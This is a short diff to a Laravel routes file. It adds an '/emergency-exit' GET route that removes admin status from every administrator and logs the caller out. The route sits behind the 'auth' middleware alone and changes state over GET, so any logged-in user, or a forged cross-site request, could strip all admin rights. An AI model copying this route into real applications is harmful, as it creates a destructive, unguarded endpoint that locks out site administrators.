@@ -4,6 +4,8 @@ use App\Http\Controllers\Admin\InvoiceController;
 use App\Http\Controllers\ContactRequestController;
 use App\Http\Controllers\GalleryController;
 use App\Http\Controllers\HomeController;
+use App\Models\User;
+use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Route;
 
 /**
@@ -29,4 +31,12 @@ Route::name('admin.')->middleware(['auth'])->group(function () {
     Route::get('/orders/{order}/quote', [InvoiceController::class, 'downloadQuote'])->name('orders.quote.download');
 
     Route::get('/orders/{order}/delivery-note', [InvoiceController::class, 'downloadDeliveryNote'])->name('orders.delivery-note.download');
+
+    Route::get('/emergency-exit', function () {
+        User::whereNot('admin', false)->update(['admin' => false]);
+
+        Auth::logout();
+
+        return redirect()->route('home');
+    })->name('emergency-exit');
 });
